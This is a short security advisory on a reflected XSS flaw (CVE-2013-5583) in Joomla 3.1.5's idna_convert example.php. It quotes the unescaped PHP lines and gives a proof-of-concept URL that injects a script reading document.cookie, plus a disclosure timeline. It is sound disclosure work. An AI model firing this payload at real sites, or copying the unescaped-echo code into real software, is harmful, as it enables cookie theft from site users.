---
comments: true
date: 2013-08-05 12:58:30
layout: post
slug: joomla-core-3_1_5_reflected-xss-vulnerability
title: Joomla core 3.1.5 reflected XSS vulnerability
categories:
- Security
- Vulnerabilities
- Web Apps
tags:
- CVE-2013-5583
- advisory
- joomla
- pentesting
- security
- vulnerability
- xss
---

[Joomla](http://www.joomla.org) core `3.1.5` suffers from a reflected XSS vulnerability that allows to inject HTML and malicious scripts. This can be exploited by malicious people to steal cookies and other sensitive information of other legitimate users in the context of the affected website. 

##  Vulnerability 

The affected file `libraries/idna_convert/example.php` has multiple injection points; 

The unsanitized `lang` parameter in line 24:

```php
if (isset($_REQUEST['lang'])) {
    if ('de' == $_REQUEST['lang'] || 'en' == $_REQUEST['lang']) $lang = $_REQUEST['lang'];
    $add .= '<input type="hidden" name="lang" value="'.$_REQUEST['lang'].'" />'."\n";
}
```

While lines 112 and 119 print out the unsanitized file name:

```php
     <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
```

The attacker can exploit these weaknesses to execute arbitrary HTML and script code tricking a legitimate logged-in user to visit a malicious crafted url:

```html
http://localhost/joomla/libraries/idna_convert/example.php?lang="><script>alert(document.cookie);</script><!--
``` 

### CVE
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2013-5583](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-5583) to the vulnerability.

### Disclosure
04/09: Vulnerability advised to the Joomla developers
05/09: Fixed deleting the example.php file
05/09: Vulnerability disclosure


